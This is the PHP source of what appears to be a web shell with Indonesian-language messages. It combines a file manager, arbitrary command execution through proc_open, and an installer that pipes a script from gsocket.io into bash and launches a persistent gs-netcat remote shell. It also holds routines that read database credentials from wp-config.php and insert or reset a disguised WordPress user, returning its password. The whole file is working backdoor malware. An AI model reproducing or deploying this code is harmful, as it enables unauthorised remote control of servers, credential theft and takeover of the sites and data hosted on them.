function sanitize_path($path) {
    $path = realpath($path);
    if ($path === false) return false;
    return $path;
}

function get_directory($dir) {
    $dir = isset($_GET['dir']) ? $_GET['dir'] : '/';
    $dir = sanitize_path($dir);
    return $dir ?: '/';
}

function format_size($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function get_file_type($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $types = [
        'php' => 'PHP', 'html' => 'HTML', 'css' => 'CSS', 'js' => 'JS',
        'jpg' => 'IMG', 'jpeg' => 'IMG', 'png' => 'IMG', 'gif' => 'IMG',
        'pdf' => 'PDF', 'doc' => 'DOC', 'docx' => 'DOC', 'txt' => 'TXT',
        'zip' => 'ZIP', 'rar' => 'RAR'
    ];
    return $types[$ext] ?? 'FILE';
}

function get_permissions($path) {
    $perms = fileperms($path);
    $info = '';
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? 'x' : '-';
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? 'x' : '-';
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? 'x' : '-';
    return $info;
}

function get_file_color($path) {
    if (is_writable($path) && is_readable($path)) return '#6a8a5a';
    elseif (!is_writable($path) && is_readable($path)) return '#b06040';
    elseif (!is_readable($path)) return '#8a6a4a';
    return '#b8a090';
}

function unzip_file($zip_path, $extract_to) {
    if (!class_exists('ZipArchive')) return ['error' => 'ZipArchive tidak tersedia'];
    $zip = new ZipArchive();
    if ($zip->open($zip_path) === true) {
        $zip->extractTo($extract_to);
        $zip->close();
        return ['success' => 'Ekstrak berhasil'];
    }
    return ['error' => 'Gagal membuka ZIP'];
}

function execute_command($cmd, $cwd) {
    $cmd = trim($cmd ?? '');
    if ($cmd === '') return ['output' => ''];
    
    if (strpos($cmd, 'cd ') === 0) {
        $dir = trim(substr($cmd, 3) ?? '');
        if ($dir === '..') $new_dir = dirname($cwd);
        elseif ($dir === '~' || $dir === '') $new_dir = getenv('HOME') ?: '/';
        elseif (strpos($dir, '/') === 0 || strpos($dir, ':') === 1) $new_dir = $dir;
        else $new_dir = $cwd . DIRECTORY_SEPARATOR . $dir;
        if (is_dir($new_dir)) {
            return ['cd_success' => realpath($new_dir)];
        }
        return ['output' => 'cd: ' . $dir . ': No such directory'];
    }
    if ($cmd === 'pwd') return ['output' => $cwd];
    if ($cmd === 'ls' || $cmd === 'dir') {
        $items = scandir($cwd);
        $result = '';
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = $cwd . DIRECTORY_SEPARATOR . $item;
            $perm = get_permissions($path);
            $size = is_dir($path) ? '-' : format_size(filesize($path));
            $result .= $perm . ' ' . str_pad($size, 10) . ' ' . $item . "\n";
        }
        return ['output' => $result ?: '(empty)'];
    }
    if ($cmd === 'clear' || $cmd === 'cls') return ['clear' => true];
    if ($cmd === 'help' || $cmd === '?') {
        return ['output' => "cd | pwd | ls | clear | help | cat | rm | mkdir | touch | chmod | exit"];
    }
    if (strpos($cmd, 'cat ') === 0) {
        $file = trim(substr($cmd, 4) ?? '');
        $path = $cwd . DIRECTORY_SEPARATOR . basename($file);
        if (file_exists($path) && is_file($path)) {
            return ['output' => file_get_contents($path)];
        }
        return ['output' => 'cat: ' . $file . ': No such file'];
    }
    if (strpos($cmd, 'rm ') === 0) {
        $file = trim(substr($cmd, 3) ?? '');
        $path = $cwd . DIRECTORY_SEPARATOR . basename($file);
        if (file_exists($path) && is_file($path)) {
            unlink($path);
            return ['output' => 'removed: ' . $file];
        }
        return ['output' => 'rm: ' . $file . ': No such file'];
    }
    if (strpos($cmd, 'mkdir ') === 0) {
        $dir = trim(substr($cmd, 6) ?? '');
        $path = $cwd . DIRECTORY_SEPARATOR . basename($dir);
        if (!file_exists($path)) {
            mkdir($path, 0755, true);
            return ['output' => 'created: ' . $dir];
        }
        return ['output' => 'mkdir: ' . $dir . ': File exists'];
    }
    if (strpos($cmd, 'touch ') === 0) {
        $file = trim(substr($cmd, 6) ?? '');
        $path = $cwd . DIRECTORY_SEPARATOR . basename($file);
        if (!file_exists($path)) file_put_contents($path, '');
        else touch($path);
        return ['output' => 'touched: ' . $file];
    }
    if (strpos($cmd, 'chmod ') === 0) {
        $parts = explode(' ', $cmd, 3);
        if (count($parts) < 3) return ['output' => 'Usage: chmod <file> <permission>'];
        $path = $cwd . DIRECTORY_SEPARATOR . basename($parts[1] ?? '');
        if (file_exists($path)) {
            chmod($path, octdec($parts[2] ?? ''));
            return ['output' => 'chmod: ' . $parts[1] . ' -> ' . $parts[2]];
        }
        return ['output' => 'chmod: ' . $parts[1] . ': No such file'];
    }
    if ($cmd === 'exit') return ['exit' => true];
    
    $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
    $process = proc_open($cmd, $descriptorspec, $pipes, $cwd);
    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        $error = stream_get_contents($pipes[2]);
        fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
        proc_close($process);
        return ['output' => $output ?: $error ?: '(no output)'];
    }
    return ['output' => $cmd . ': command not found'];
}

function gs_get_home() {
    $home = getenv('HOME');
    return empty($home) ? '/home/' . get_current_user() : $home;
}
function gs_gen_secret() {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $s = '';
    for ($i = 0; $i < 32; $i++) $s .= $chars[rand(0, 61)];
    return $s;
}
function gs_get_secret() {
    $home = gs_get_home();
    $file = $home . '/.gs_secret';
    if (file_exists($file)) return trim(file_get_contents($file) ?? '');
    return null;
}
function gs_save_secret($s) {
    $file = gs_get_home() . '/.gs_secret';
    file_put_contents($file, $s);
    chmod($file, 0600);
}
function gs_is_installed() {
    $check = shell_exec('which gs-netcat 2>/dev/null');
    return !empty(trim($check ?? ''));
}
function gs_is_running() {
    $ps = shell_exec('ps aux | grep gs-netcat | grep -v grep 2>/dev/null');
    return !empty(trim($ps ?? ''));
}
function gs_run_cmd($cmd) {
    $output = array();
    exec($cmd . ' 2>&1', $output, $return);
    return implode("\n", $output);
}
function gs_install() {
    $secret = gs_gen_secret();
    gs_save_secret($secret);
    $output = "=== GSOCKET INSTALL ===\nUser: " . get_current_user() . "\nHOME: " . gs_get_home() . "\nSecret: $secret\n\n";
    $result = gs_run_cmd('bash -c "$(curl -fsSL https://gsocket.io/x)"');
    $output .= $result . "\n";
    if (gs_is_installed()) {
        gs_run_cmd("nohup gs-netcat -s '{$secret}' -i > /dev/null 2>&1 &");
        $output .= "\nSUCCESS! Gsocket running with secret: {$secret}\n";
    }
    return $output;
}
function gs_start() {
    $secret = gs_get_secret();
    if ($secret) { gs_run_cmd("nohup gs-netcat -s '{$secret}' -i > /dev/null 2>&1 &"); return "Started!"; }
    return "No secret. Install first.";
}
function gs_stop() {
    gs_run_cmd('pkill -f gs-netcat 2>/dev/null');
    return "Stopped!";
}
function gs_status() {
    return ['installed' => gs_is_installed(), 'running' => gs_is_running(), 'secret' => gs_get_secret(), 'user' => get_current_user()];
}

function wp_find_config($base, $depth) {
    if ($depth > 6) return null;
    if (!is_dir($base)) return null;
    $f = $base . DIRECTORY_SEPARATOR . 'wp-config.php';
    if (is_file($f)) return $f;
    $dh = @opendir($base);
    if (!$dh) return null;
    while (false !== ($e = readdir($dh))) {
        if ($e === '.' || $e === '..' || $e[0] === '.') continue;
        $p = $base . DIRECTORY_SEPARATOR . $e;
        if (is_dir($p) && !is_link($p)) {
            $r = wp_find_config($p, $depth + 1);
            if ($r) { closedir($dh); return $r; }
        }
    }
    closedir($dh);
    return null;
}
function wp_pick($src, $key) {
    if (preg_match("/define\s*\(\s*['\"]" . $key . "['\"]\s*,\s*['\"]((?:[^'\"\\\\]|\\\\.)*)['\"]/i", $src, $m)) {
        return stripcslashes($m[1] ?? '');
    }
    return null;
}
function wp_generate_name() {
    $first = ['James','John','Robert','Michael','William','David','Richard','Joseph','Thomas'];
    $last = ['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis'];
    $f = $first[array_rand($first)];
    $l = $last[array_rand($last)];
    return ['user' => $f . $l, 'email' => strtolower($f) . '.' . strtolower($l) . rand(10,99) . '@gmail.com', 'display' => $f . ' ' . $l];
}
function wp_generate_password($length = 8) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $pass = '';
    for ($i = 0; $i < $length; $i++) $pass .= $chars[rand(0, 61)];
    return $pass;
}
function wp_create_user() {
    $name = wp_generate_name();
    $NEW_USER = $name['user'];
    $NEW_EMAIL = $name['email'];
    $DISPLAY_NAME = $name['display'];
    $NEW_PASS = wp_generate_password(8);
    
    $roots = array_filter(array_unique([$_SERVER['DOCUMENT_ROOT'] ?? '', __DIR__, dirname(__DIR__), getenv('HOME')]));
    $wp_config = null;
    foreach ($roots as $r) {
        $real = @realpath($r);
        if ($real) { $wp_config = wp_find_config($real, 0); if ($wp_config) break; }
    }
    if (!$wp_config) return ['error' => 'wp-config.php tidak ditemukan'];
    
    $src = @file_get_contents($wp_config);
    if (!$src) return ['error' => 'Tidak bisa baca wp-config'];
    
    $DB_NAME = wp_pick($src, 'DB_NAME');
    $DB_USER = wp_pick($src, 'DB_USER');
    $DB_PASS = wp_pick($src, 'DB_PASSWORD');
    $DB_HOST = wp_pick($src, 'DB_HOST') ?: 'localhost';
    $CHARSET = wp_pick($src, 'DB_CHARSET') ?: 'utf8';
    $PREFIX = 'wp_';
    if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $src, $m)) $PREFIX = $m[1] ?? 'wp_';
    
    if (!$DB_NAME || $DB_USER === null) return ['error' => 'Gagal parse DB credentials'];
    
    $mysqli = @new mysqli($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME);
    if ($mysqli->connect_errno) return ['error' => 'DB Error: ' . $mysqli->connect_error];
    @$mysqli->set_charset($CHARSET);
    
    $row = $mysqli->query("SELECT option_value FROM `{$PREFIX}options` WHERE option_name='siteurl' LIMIT 1")->fetch_row();
    $site_url = $row ? $row[0] : '';
    $row = $mysqli->query("SELECT option_value FROM `{$PREFIX}options` WHERE option_name='blogname' LIMIT 1")->fetch_row();
    $blog_name = $row ? $row[0] : '';
    
    $phpass_file = dirname($wp_config) . '/wp-includes/class-phpass.php';
    if (!is_file($phpass_file)) {
        foreach (['wordpress','wp'] as $sub) {
            $alt = dirname($wp_config) . '/' . $sub . '/wp-includes/class-phpass.php';
            if (is_file($alt)) { $phpass_file = $alt; break; }
        }
    }
    if (!is_file($phpass_file)) return ['error' => 'class-phpass.php tidak ditemukan'];
    require_once $phpass_file;
    $hasher = new PasswordHash(8, true);
    $hashed = $hasher->HashPassword($NEW_PASS);
    
    $user_login_esc = $mysqli->real_escape_string($NEW_USER);
    $user_email_esc = $mysqli->real_escape_string($NEW_EMAIL);
    $hashed_esc = $mysqli->real_escape_string($hashed);
    
    $exist = $mysqli->query("SELECT ID FROM `{$PREFIX}users` WHERE user_login='{$user_login_esc}' OR user_email='{$user_email_esc}' LIMIT 1");
    if ($exist && $row = $exist->fetch_assoc()) {
        $user_id = (int)$row['ID'];
        $mysqli->query("UPDATE `{$PREFIX}users` SET user_pass='{$hashed_esc}', user_email='{$user_email_esc}' WHERE ID={$user_id}");
        $status = 'User sudah ada -> password & email di-reset.';
    } else {
        $now = date('Y-m-d H:i:s');
        $nice = $mysqli->real_escape_string(strtolower(preg_replace('/[^a-zA-Z0-9]+/', '-', $NEW_USER)));
        $display_esc = $mysqli->real_escape_string($DISPLAY_NAME);
        $mysqli->query("INSERT INTO `{$PREFIX}users` (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name)
                    VALUES ('{$user_login_esc}','{$hashed_esc}','{$nice}','{$user_email_esc}','{$now}',0,'{$display_esc}')");
        $user_id = (int)$mysqli->insert_id;
        $status = 'User baru dibuat.';
    }
    $mysqli->close();
    return ['status' => $status, 'site' => $blog_name, 'url' => $site_url, 'username' => $NEW_USER, 'password' => $NEW_PASS, 'email' => $NEW_EMAIL];
}
